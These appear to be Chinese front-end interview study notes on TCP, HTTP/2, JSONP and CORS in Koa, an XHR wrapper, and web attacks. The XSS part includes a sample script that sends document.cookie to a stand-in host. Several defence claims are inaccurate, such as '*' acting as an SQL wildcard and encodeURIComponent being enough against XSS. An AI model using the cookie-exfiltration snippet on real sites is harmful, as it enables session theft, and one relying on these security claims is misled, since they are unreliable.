* TCP 三次握手的过程
  1. 发送端先发送一次带 syn(同步标记 synchronized) 标志的数据包
  2. 接收端接收到标记后，返送带有 syn 及 ACK 标志的数据包
  3. 发送端接收到后，发送标志 ACK 的数据包完成三次握手，客户端与服务端开始传送数据


* 从浏览器输入 URL 后，协议之间发生了什么（下面是从协议上来回答，不涉及具体业务通信）
  1. 先由 DNS 协议解析域名为 IP，通过具体 IP 访问到服务器；、
  2. 发起 http 协议生成报文；
  3. 服务器 tcp 协议为了方便通信，将 http 报文分割为多个报文段(stream)，接下来为了开始进行数据通信，客户端与服务器之间开始进行三次握手建立 tcp 连接用于数据传输，建立成功后 tcp 重组之前 http 分割的报文(继承于 stream 的报文重组)，根据 http 协议服务对应路由进行业务处理，最后同样利用 TCP/IP 协议将处理结果回传给客户端(tcp 封装为 http 返回)


* http2 与 http1.X 相比的新特性
  1. ** 新的二进制格式（Binary Format）** HTTP1.x的解析是基于文本。基于文本协议的格式解析存在天然缺陷，文本的表现形式有多样性，要做到健壮性考虑的场景必然很多，二进制则不同，只认0和1的组合。基于这种考虑HTTP2.0的协议解析决定采用二进制格式，实现方便且健壮。

  2. ** 多路复用（MultiPlexing））** 即连接共享，即每一个request都是是用作连接共享机制的。一个request对应一个id，这样一个连接上可以有多个request，每个连接的request可以随机的混杂在一起，接收方可以根据request的 id将request再归属到各自不同的服务端请求里面。

  3. ** header压缩，如上文中所言 ** 对前面提到过 HTTP1.x 的header带有大量信息，而且每次都要重复发送，HTTP2.0使用encoder来减少需要传输的header大小，通讯双方各自cache一份header fields表，既避免了重复header的传输，又减小了需要传输的大小。

  4. ** 服务端推送（server push）** 同SPDY一样，HTTP2.0也具有server push功能。


* 说一下你平时怎么解决跨域的。以及后续JSONP的原理和实现以及cors怎么设置

  首先要知道跨域是浏览器为了 web 安全限制的同源策略，当请求接口的 协议名、域名或端口名 有其中一个不同时都会触发同源策略而导致跨域，处理跨域的方式有以下几种；
  1. 使用 JSONP
  2. 使用 cors
  3. chrome 下可以修改 chrome 引用路径后加上参数以降低安全性标准来去除跨域要求

  ** JSONP原理：** 首先 jsonp 只能是 get 方式的请求，设置请求类型为 jsonp 后，请求的 query 参数需加上一个 callback 属性声明 jsonp 返回时触发的函数名，所以 jsonp 本质上是默认加多一个 callback 参数入 query 上，然后通过服务端获取这个 callback 的值后，将需要返回的 json 通过这个 callback 的值利用调用函数的方式包裹返回，以下为我个人写的简短例子，如果用 jq 的话，会自动触发指定 callback 函数将参数注入 success 的响应参数内，如果前端是原生请求，大家还需要自行声明 callback 值的函数（原生的话是你自己定的，你肯定知道吧= =），函数参数即是返回的响应。
  ```js
    // 前端
    $('[name="button"]').click(function () {
      $.ajax({
        url: '/jsonp',
        dataType: 'jsonp',
        data: {
          name: 'YOLO'
        },
        success (data) {
          console.log(data)
        },
        error (err) {
          console.log(err)
        }
      })
    })

    // 后端处理（使用了 koa-router），我这里就是用原生响应，没有用 ctx.body，反正结果一致无所谓
    router.get('/jsonp', async (ctx, next) => {
      console.log(ctx.request.query)
      let data = {
        name: ctx.request.query.name
      }
      ctx.res.writeHead(200, 'jsonp ok')
      ctx.res.end(`${ctx.request.query.callback}(${JSON.stringify(data)})`)
    })

    // 结果
    jQuery33102673488075454209_1544601431418({"name":"YOLO"})
  ```
  ** cors 设置：** 通过后端修改响应头部允许方法的白名单来实现配置，例如我下面 node 的例子，其他语言是一样的道理
  ```js
    // 单个请求
    router.post('/test', async (ctx, next) => {
      let data = {
        name: 'cors'
      }
      ctx.res.setHeader('Access-Control-Allow-Methods', '*') // 允许所有请求方式
      ctx.res.setHeader('Access-Control-Allow-Origin', '*') // 允许所有域跨域请求，一般配置你允许的就好，千万别配所有的都允许哦
      ctx.res.writeHead(200, 'cors ok')
      ctx.res.end(JSON.stringify(data))
    })

    // 你也可以写成 koa 的中间件⬇️（或者 express，我这里只写koa）
    // 注意记得将这个统一处理的 cors 中间件的加载放在 router 中间件前就行了，否则响应已经发送后就不能更改头部选项了
    // 如果硬要放后面，那就请在处理请求时先执行 await next() 让 cors 处理咯（不过这也太sb了，违背常理。。。谁会每次处理请求都先 next 一下，而且还怕与其他中间件的执行顺序发生冲突）
    const cors = async (ctx, next) => {
      // 放在自定义响应处理前处理后，使用记得调用 next 让中间件继续往下走
      ctx.res.setHeader('Access-Control-Allow-Methods', '*')
      ctx.res.setHeader('Access-Control-Allow-Origin', '*')
      await next()
    }
    app.use(cors)
    app.use(router.routes())
  ```

* ajax原生封装
  ```js
    var http = function (option) {
      // 过滤请求成功后的响应对象
      function getBody (xhr) {
        var text = xhr.responseText || xhr.response
        if (!text) {
          return text
        }

        try {
          return JSON.parse(text)
        } catch (err) {
          return text
        }
      }

      var xhr = new XMLHttpRequest();
      // 自定义 beforeSend 函数
      if(option.beforeSend instanceof Function) {
        if (option.beforeSend(xhr) === false) {
          return false
        }
      }

      xhr.onreadystatechange = function () {
        if (xhr.status === 200) {
          if (xhr.readyState === 4) {
            // 成功回调
            option.onSuccess(getBody(xhr))
          }
        }
      }

      // 请求失败
      xhr.onerror = function (err) {
        option.onError(err)
      }

      xhr.open(option.type, option.url, true)

      // 当请求为上传文件时回调上传进度
      if (xhr.upload) {
        xhr.upload.onprogress = function (event) {
          if (event.total > 0) {
            event.percent = event.loaded / event.total * 100;
          }
          // 监控上传进度回调
          if (option.onProgress instanceof Function) {
            option.onProgress(event)
          }
        }
      }

      // 自定义头部
      const headers = option.headers || {}
      for (var item in headers) {
        xhr.setRequestHeader(item, headers[item])
      }

      xhr.send(option.data)
    }
  ```
* web攻防，简单说明 xss、csrf、sql 注入三种攻击方式如何防护
  1. xss（cross site script）跨站式脚本攻击
    * 如何攻击：一般是因为技术人员直接使用客户端发送过来的参数存进数据库导致，比如客户端是 form 表单提交时，恶意用户直接提交这样一段 js 脚本

      ```html
        <script type="text/javascript">
          var a = document.crateElement('a')
          a.href = 'http://www.xxx.com?cookie=' + document.cookie
          a.innerHTML = 'xxx.png'
        </script>
      ```
      而此时后端人员未经过转义直接将这段脚本存入数据库，在下次前端需要展示时，将这段脚本以用户正常的上传内容取出然后直接注入为 html 展示给所有用户时，其他用户一旦点击了这个伪造的图片，便触发了 get 请求发送了当前用户的所有 cookie 信息给恶意者，如果里面带有相关登录信息就非常危险了，如果做的再无耻点，根本不伪造图片了，直接打开就发送就会立刻中招，不过如果不伪装很容易被发现并解决。

    * 解决办法：最简单的是后端取到值后先转义一次，如使用 node 可以使用 encodeURIComponent 直接转义再存入数据库，而前端也不要使用直接注入 html 这种糟糕的方式，可以注入 innerText 作为纯文本解析展示内容，而不是解析为 html，前端一般禁止直接注入 html，即使一定要注入，也要做好安全措施。
  2. csrf（cross site request forgery） 跨站请求伪造
    * 如何攻击：这个比较简单，就是抓包抓请求需要的参数与头部信息，多次输入不同参数，判断参数规律后然后伪造一份即可，当关键性数据在目标网站是使用 get 请求时，攻击者只需要在自己的网站伪造一个按钮或图片就 get 请求目标网站，此时由于用户在目标网站已登录过所以已经存在 cookie 保存用户登录态，这时就会直接中招了，简单来说就是伪造恶意请求。
    * 如何防护：
      1. 关键性数据的请求，永远不要用 get，需要获取或传输较为关键数据时，一定使用 post 方式请求，因为 post 是会触发浏览器的同源策略而导致跨域的，这从客户端上进行了一次防护；
      2. 生成一个随机的 token 存至 cookie 中，由客户端获取后，每次请求都需要加上这个 token 在请求头部，服务端获取后与 session 中存取的 token 进行比对，若错误则需重新获取或直接报错，这样就杜绝了第三方的直接伪造
        * 因为 token 是随机的，从第三方 get 时在未获取的情况下无法猜出 token，所以杜绝了上面的第三方 get 伪造。
        * 而随机产生的 token 一般我们在 get 服务任何一个不那么重要的接口时就返回了（或者特定请求也可），此时你发送 post 的前提就是必须先访问服务获取 token，而如果攻击者直接伪造 post 进行服务端请求跨过浏览器同源策略那也就失去了意义了，因为你无法获取用户当前的 cookie 与 get 的 token，除非结合 xss 在已知用户 cookie 的条件下发送到攻击者邮箱，然后攻击者根据这个 cookie 直接伪造，但是这个条件已经很苛刻了。
        * 目前相对安全的方式是 https + token 校验，https 在传输层保证数据加密，否定了抓包的前提性可能，也使 DNS 无法被拦截
  3. SQL 注入
    * 如何攻击：举一个简单的例子大家就明白了，例如当我登录某个网站的账号时，只需要账号和密码，而不需要验证码，此时如果 sql 是写成这样的，并且后端业务是直接取用户输入取查询
    ```sql
      select * from user where username = [username] and password = [password]
    ```
    此时我将用户名与密码都写成 * ，对于 sql 来说就是通配符，此时会查处整个用户表的用户信息，原生sql不论是查到一条记录还是查到多条记录都是数组，所以开发人员取了第一条并且通过了校验，此时我们就这么进入了系统；其他类似如 -- 注释符等操作符查询如果开发者不注意都容易产生此类漏洞
    * 如何防范
      1. 过滤特殊符号：如传入 sql 的值进行通配符的正则校验，如 --、*、&、% 全部过滤校验，这就杜绝了利用一些通配符与操作符进行注入的可能；
      2. 对取值的类型与格式进行校验；
